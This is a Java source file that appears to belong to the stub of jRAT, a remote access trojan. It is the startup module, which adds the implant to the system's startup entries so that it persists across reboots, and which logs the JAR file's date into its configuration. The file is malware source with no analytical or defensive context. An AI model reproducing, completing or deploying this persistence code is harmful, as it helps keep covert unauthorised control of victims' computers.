package su.jrat.stub.modules.startup;

import java.io.File;
import java.util.Date;
import java.util.Map;

import su.jrat.common.OperatingSystem;
import su.jrat.stub.Configuration;
import su.jrat.stub.Startup;
import su.jrat.stub.utils.Utils;

public class StartupStartupModule extends StartupModule {
	
	public StartupStartupModule(Map<String, String> config) {
		super(config);
	}
	
	public void run() throws Exception {
		String currentJar = Utils.getJarFile().getAbsolutePath();

		try {
			Startup.addToStartup(Configuration.name);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS && currentJar.startsWith("/")) {
			currentJar = currentJar.substring(1, currentJar.length());
		}

		File f = new File(currentJar);
		if (f.exists()) {
			Date da = new Date(f.lastModified());
			Configuration.date = da.toString();
		}

	}

}
